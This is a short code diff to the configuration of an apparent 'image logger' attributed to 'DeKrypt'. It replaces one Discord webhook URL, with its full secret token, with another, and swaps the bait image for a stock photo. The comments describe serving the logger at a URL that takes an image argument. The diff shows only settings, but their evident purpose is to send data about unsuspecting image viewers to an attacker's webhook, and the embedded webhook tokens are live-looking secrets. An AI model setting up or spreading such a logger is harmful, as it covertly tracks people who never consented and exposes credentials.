@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1096296454806581258/KinapytnZC-oFYPYHIPyHVEzpa-0GPKzI5Uj8GQhSBU4IyeK0M2Ppen4oMT0cLkX-wge",
-    "image": "https://media.discordapp.net/attachments/921086237845102642/921090216129855609/IMG-20210905-WA0017.jpg?width=394&height=525", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1123456387545059350/R67nti_bGqrjQvcNv6mto7RDce_X6T9uUmqoyXXxsv0rM9Z-celon9JFuO5dQh8Agkrr",
+    "image": "https://hips.hearstapps.com/hmg-prod/images/gettyimages-1185282377.jpg?resize=1200:*", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
